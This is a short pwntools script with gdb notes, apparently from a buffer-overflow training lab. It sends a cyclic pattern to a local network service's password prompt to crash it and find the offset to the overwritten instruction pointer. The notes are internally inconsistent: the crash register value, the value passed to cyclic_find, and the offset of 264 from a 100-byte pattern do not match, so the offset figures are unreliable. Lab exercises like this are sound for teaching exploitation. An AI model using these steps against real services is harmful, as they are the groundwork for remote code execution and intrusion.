from pwn import *

# Prerequisite - Architecture knowledge 
"""
file examples/net-overflow/binaries/vuln_noprot --> ELF 32 = 32-bit architecture
"""

# Set up the context with the architecture 
context.update(arch='i386', os='linux')
r = remote('127.0.0.1', 4444)

r.recvuntil(b"Username: ")
r.sendline(b"bob")

# Send a cyclic payload to crash the program at the password prompt
r.recvuntil(b"Password: ")
payload = cyclic(100, n=4)
r.send(payload)

r.close()

# Examine registers / stack after SIGSEGV
"""
(gdb) continue
(gdb) info register    # EIP should be overwritten --> Program received signal SIGSEGV, Segmentation fault. 0x61616172 in ?? ()
(gdb) x/20xw $esp      # Cyclic pattern should be visible
"""

# Get the offset to EIP
"""
python
>> from pwn import *
>> cyclic_find(p32(0x63616171), n=4)       
>> offset = 264
"""
